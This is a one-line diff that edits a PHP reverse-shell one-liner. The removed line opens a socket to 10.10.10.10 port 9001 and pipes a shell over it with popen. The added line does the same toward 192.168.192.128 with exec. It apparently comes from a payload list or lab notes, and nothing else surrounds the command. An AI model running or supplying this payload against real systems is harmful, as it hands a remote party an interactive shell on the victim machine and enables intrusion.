@@ -1,1 +1,1 @@
-php -r '$sock=fsockopen("10.10.10.10",9001);popen("sh <&3 >&3 2>&3", "r");'
+php -r '$sock=fsockopen("192.168.192.128",9001);exec("sh <&3 >&3 2>&3");'
